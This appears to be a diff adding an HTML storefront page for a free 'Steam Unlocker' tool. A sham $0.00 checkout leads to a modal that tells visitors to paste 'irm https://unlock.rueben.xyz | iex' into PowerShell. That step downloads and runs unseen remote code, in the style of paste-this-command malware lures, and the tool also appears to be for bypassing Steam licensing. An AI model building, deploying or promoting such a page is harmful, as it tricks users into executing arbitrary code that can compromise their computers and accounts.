@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Rueben Software</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg: #0b0f1a;
+  --card: rgba(255,255,255,0.08);
+  --border: rgba(255,255,255,0.15);
+  --accent: #5b8cff;
+  --accent-2: #9f7aea;
+  --text: #e8ebf1;
+  --muted: #a0a6b8;
+}
+
+* {
+  box-sizing: border-box;
+  font-family: "Inter", sans-serif;
+}
+
+body {
+  margin: 0;
+  background: radial-gradient(1200px 600px at top, #16203b, var(--bg));
+  color: var(--text);
+}
+
+/* Header */
+header {
+  padding: 40px 20px;
+  text-align: center;
+}
+
+header h1 {
+  font-size: 2.5rem;
+}
+
+header p {
+  color: var(--muted);
+}
+
+/* Layout */
+.container {
+  max-width: 1100px;
+  margin: auto;
+  padding: 20px;
+}
+
+/* Product Card */
+.product {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 30px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  padding: 30px;
+  backdrop-filter: blur(20px);
+}
+
+.product img {
+  width: 100%;
+  border-radius: 14px;
+  border: 1px solid var(--border);
+}
+
+.price {
+  font-size: 2rem;
+  font-weight: 700;
+  margin: 20px 0;
+}
+
+/* Button */
+button {
+  background: linear-gradient(135deg, var(--accent), var(--accent-2));
+  border: none;
+  padding: 14px 26px;
+  border-radius: 12px;
+  font-weight: 600;
+  color: white;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 30px rgba(91,140,255,0.4);
+}
+
+/* Modal */
+.modal {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  display: none;
+  align-items: center;
+  justify-content: center;
+}
+
+.modal-content {
+  position: relative;
+  width: 90%;
+  max-width: 450px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 18px;
+  padding: 30px;
+  text-align: center;
+  backdrop-filter: blur(25px);
+}
+
+.close-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background: none;
+  color: var(--muted);
+  font-size: 1.2rem;
+}
+
+/* SUCCESS BOX */
+.command-box {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 20px;
+  padding: 12px;
+  border-radius: 12px;
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  position: relative;
+  overflow: hidden;
+}
+
+.command-box::before {
+  content: "";
+  position: absolute;
+  inset: -2px;
+  background: linear-gradient(120deg, #5b8cff, #9f7aea, #5b8cff);
+  filter: blur(10px);
+  opacity: 0.4;
+}
+
+.command-box code {
+  z-index: 1;
+  color: #cfe3ff;
+  font-size: 0.85rem;
+}
+
+.command-box button {
+  z-index: 1;
+  padding: 8px 12px;
+  font-size: 0.8rem;
+}
+
+.steps {
+  margin-top: 20px;
+  color: var(--muted);
+  font-size: 0.9rem;
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+  .product {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Rueben Software</h1>
+  <p>Modern tools built for power users</p>
+</header>
+
+<div class="container">
+  <div class="product">
+    <img src="https://software.rueben.xyz/img/unlocker-window.png">
+
+    <div>
+      <h2>Steam Unlocker</h2>
+      <p>Unlock Steam content for offline use.</p>
+
+      <ul>
+        <li>✔ Lightweight</li>
+        <li>✔ No ads</li>
+        <li>✔ Offline</li>
+      </ul>
+
+      <div class="price">$0.00</div>
+      <button onclick="openCheckout()">Purchase</button>
+    </div>
+  </div>
+</div>
+
+<!-- Checkout -->
+<div class="modal" id="checkout">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeCheckout()">✕</button>
+    <h3>Checkout</h3>
+    <p>Total: $0.00</p>
+    <button onclick="completeCheckout()">Confirm</button>
+  </div>
+</div>
+
+<!-- Success -->
+<div class="modal" id="success">
+  <div class="modal-content">
+
+    <button class="close-btn" onclick="closeSuccess()">✕</button>
+
+    <h3>🎉 Ready to Install</h3>
+    <p>Run this in PowerShell:</p>
+
+    <div class="command-box">
+      <code id="cmd">irm https://unlock.rueben.xyz | iex</code>
+      <button onclick="copyCmd()">Copy</button>
+    </div>
+
+    <div class="steps">
+      <p>1. Open PowerShell</p>
+      <p>2. Paste command</p>
+      <p>3. Press Enter</p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+function openCheckout() {
+  document.getElementById("checkout").style.display = "flex";
+}
+
+function closeCheckout() {
+  document.getElementById("checkout").style.display = "none";
+}
+
+function completeCheckout() {
+  closeCheckout();
+  document.getElementById("success").style.display = "flex";
+}
+
+function closeSuccess() {
+  document.getElementById("success").style.display = "none";
+}
+
+function copyCmd() {
+  const text = document.getElementById("cmd").innerText;
+  navigator.clipboard.writeText(text);
+
+  const btn = document.querySelector(".command-box button");
+  btn.innerText = "Copied!";
+  setTimeout(() => btn.innerText = "Copy", 1500);
+}
+</script>
+
+</body>
+</html>
